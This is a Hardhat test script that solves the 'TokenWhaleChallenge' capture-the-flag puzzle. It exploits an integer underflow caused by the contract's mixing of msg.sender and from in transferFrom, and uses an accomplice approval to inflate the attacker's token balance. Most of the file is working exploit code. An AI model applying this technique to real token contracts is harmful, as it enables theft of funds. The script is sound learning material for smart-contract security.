import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, BigNumber } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let accompliceContract: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;
  let accomplice: SignerWithAddress;
  let tx: any;

  before(async () => {
    [accomplice, attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    accompliceContract = target.connect(accomplice);

    // transfer some funds to accomplice
    if ((await accomplice.getBalance()).lt(ethers.utils.parseEther(`0.1`))) {
      tx = attacker.sendTransaction({
        to: await accomplice.getAddress(),
        value: ethers.utils.parseEther(`0.1`),
      });
    }
  });

  it('exploit', async () => {
    let balance; 
    const attackerAddress = await attacker.getAddress();
    const accompliceAddress = await accomplice.getAddress();

    const approveTx = await target.connect(accomplice).approve(attacker.address, 1000);
    await approveTx.wait();

    balance = await target.balanceOf(attackerAddress);
    console.log(`Checking attacker: ${attackerAddress} balance: ${balance}`);

    //Move over money to create an underflow condition
    const transferTx = await target.connect(attacker).transfer(accomplice.address, 999);
    await transferTx.wait();
    
    balance = await target.balanceOf(attackerAddress);
    console.log(`Checking attacker: ${attackerAddress} balance: ${balance}`);

    // Execute underflow attack since msg.sender and from are not use correctly 
    const transferFromTx = await target
      .connect(attacker)
      .transferFrom(accomplice.address, "0x0000000000000000000000000000000000000000", 2);
    await transferFromTx.wait();

    balance = await target.balanceOf(attackerAddress);
    console.log(`Checking attacker: ${attackerAddress} balance: ${balance}`);
    

    expect(await target.isComplete()).to.equal(true);
  });
});
